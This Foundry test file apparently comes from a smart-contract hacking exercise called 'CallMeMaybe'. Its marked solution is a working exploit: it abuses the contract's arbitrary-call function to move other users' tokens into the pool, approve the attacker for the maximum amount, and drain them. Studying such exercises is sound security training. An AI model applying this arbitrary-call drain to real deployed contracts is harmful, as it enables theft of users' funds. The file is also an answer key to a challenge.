// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import { Test, console } from "forge-std/Test.sol";
import { CallMeMaybe } from "../src/2_CallMeMaybe.sol";
import { CallMeMaybeHelper } from "../test_helper/2_CallMeMaybeSetup.sol";
import "../mocks/marqToken.sol";

contract CallMeMaybeTest is Test {
    CallMeMaybe public target;
    MarqToken public token;
    address[] public users = [address(0x01), address(0x02), address(0x03)];


    function setUp() public {
        CallMeMaybeHelper dontpeak = new CallMeMaybeHelper();
        target = dontpeak.deployed();
        token = dontpeak.token();
    }


    // function test_GetThisPassing_2() public {
    //     address hacker = address(0xBAD);

    //     uint256 startBalance = token.balanceOf(hacker);
        
        // vm.startPrank(hacker);

        // vm.stopPrank();
        
    //     assertGt(token.balanceOf(hacker), 301 ether);
    // }


    // solution
    function test_GetThisPassing_2() public {
        address hacker = address(0xBAD);

        uint256 startBalance = token.balanceOf(hacker);

        vm.startPrank(hacker);

        // join the group
        token.approve(address(target), 1 ether);
        target.joinGroup(1 ether);

        // itterate through and transfer the other users' tokens to the contract
        for (uint256 i; i < users.length; i++) {
            address user = users[i];
            bytes memory _calldataTransfer = abi.encodeCall(token.transferFrom, (user, address(target), token.balanceOf(user)));
            target.usePooledWealth(_calldataTransfer, address(token));
        }

        // form our approve calldata
        bytes memory _calldataApprove = abi.encodeCall(token.approve, (hacker, type(uint256).max));
        
        // call the contract approving ourselves to spend the tokens
        target.usePooledWealth(_calldataApprove, address(token));

        // transfer out the tokens
        token.transferFrom(address(target), hacker, 601 ether);

        vm.stopPrank();
        assertGt(token.balanceOf(hacker), 300 ether);
    }

}